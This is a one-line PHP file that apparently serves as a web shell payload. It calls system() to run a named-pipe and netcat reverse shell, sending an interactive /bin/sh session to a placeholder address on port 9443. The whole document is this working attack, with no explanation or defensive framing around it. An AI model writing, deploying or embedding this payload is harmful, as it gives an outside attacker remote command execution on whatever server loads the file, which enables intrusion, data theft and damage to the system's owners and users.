<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YYY.YYY.YYY.YYY 9443 >/tmp/f"); ?>
